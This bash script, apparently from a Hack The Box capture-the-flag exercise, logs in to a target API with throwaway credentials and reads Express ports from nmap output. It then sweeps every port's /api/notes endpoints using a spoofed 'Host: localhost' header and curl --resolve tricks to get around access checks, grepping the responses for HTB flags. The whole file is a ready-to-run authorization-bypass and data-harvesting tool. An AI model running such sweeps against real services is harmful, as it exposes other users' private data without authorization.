#!/usr/bin/env bash
set -euo pipefail
IP=${1:?IP}
NMAP_FILE=${2:?NMAP_FILE}
PRIMARY_PORT=${3:-30497}
TO=${4:-8}
OUT_DIR=${5:-/workspace/recon/httpx}
DIR="$OUT_DIR/${IP}_notes_sweep"
mkdir -p "$DIR"
# Use primary token if exists, otherwise login
BASE_PRIMARY="$OUT_DIR/${IP}_${PRIMARY_PORT}"
TOKEN=""
if [[ -s "$BASE_PRIMARY/token.txt" ]]; then TOKEN=$(cat "$BASE_PRIMARY/token.txt"); fi
if [[ -z "$TOKEN" ]]; then
  mkdir -p "$BASE_PRIMARY"
  jq -n --arg email "a@a.com" --arg password "a" '{email:$email,password:$password}' > "$BASE_PRIMARY/creds.json"
  curl -fsS -m 12 --connect-timeout 8 -H 'Content-Type: application/json' -d @"$BASE_PRIMARY/creds.json" "http://$IP:$PRIMARY_PORT/api/auth/login" > "$BASE_PRIMARY/login.json"
  TOKEN=$(jq -r .token "$BASE_PRIMARY/login.json")
  printf '%s' "$TOKEN" > "$BASE_PRIMARY/token.txt"
fi
# Extract Node.js Express ports
PORTS=$(awk '/\/tcp\s+open\s+http\s+Node\.js Express framework/{print $1}' "$NMAP_FILE" | cut -d/ -f1 | sort -n | uniq)
# Always include primary
PORTS="$PORTS $PRIMARY_PORT"
printf '%s\n' $PORTS | sort -n | uniq > "$DIR/ports.txt"
# Sweep
: > "$DIR/hits.txt"
while read -r p; do
  [ -z "$p" ] && continue
  URL_ALL="http://$IP:$p/api/notes/all"
  URL_LIST="http://$IP:$p/api/notes?all=1"
  # Try with token
  curl -fsS -m "$TO" --connect-timeout "$TO" -H "Authorization: Bearer $TOKEN" "$URL_ALL" -i > "$DIR/${p}_all.head" 2>/dev/null || true
  curl -fsS -m "$TO" --connect-timeout "$TO" -H "Authorization: Bearer $TOKEN" "$URL_LIST" -i > "$DIR/${p}_list.head" 2>/dev/null || true
  # Try with Host: localhost
  curl -fsS -m "$TO" --connect-timeout "$TO" -H "Authorization: Bearer $TOKEN" -H 'Host: localhost' "$URL_ALL" -i > "$DIR/${p}_all_hostloc.head" 2>/dev/null || true
  curl -fsS -m "$TO" --connect-timeout "$TO" -H "Authorization: Bearer $TOKEN" -H 'Host: localhost' "$URL_LIST" -i > "$DIR/${p}_list_hostloc.head" 2>/dev/null || true
  # Try resolve to localhost authority
  curl -fsS -m "$TO" --connect-timeout "$TO" --resolve "localhost:$p:$IP" -H "Authorization: Bearer $TOKEN" -i "http://localhost:$p/api/notes/all" > "$DIR/${p}_all_resolve.head" 2>/dev/null || true
  curl -fsS -m "$TO" --connect-timeout "$TO" --resolve "localhost:$p:$IP" -H "Authorization: Bearer $TOKEN" -i "http://localhost:$p/api/notes?all=1" > "$DIR/${p}_list_resolve.head" 2>/dev/null || true
  # Grep 200s and flags
  rg -n "^HTTP/1\\.[01] 200" -S "$DIR/${p}_list.head" "$DIR/${p}_list_hostloc.head" "$DIR/${p}_list_resolve.head" || true >> "$DIR/hits.txt"
  awk 'f{print} /^$/{f=1}' "$DIR/${p}_all.head" "$DIR/${p}_list.head" "$DIR/${p}_all_hostloc.head" "$DIR/${p}_list_hostloc.head" "$DIR/${p}_all_resolve.head" "$DIR/${p}_list_resolve.head" 2>/dev/null | rg -n "HTB\{[^}]+\}" -S || true >> "$DIR/hits.txt"
  sleep 0.05
done < "$DIR/ports.txt"
sed -n '1,200p' "$DIR/hits.txt" || true
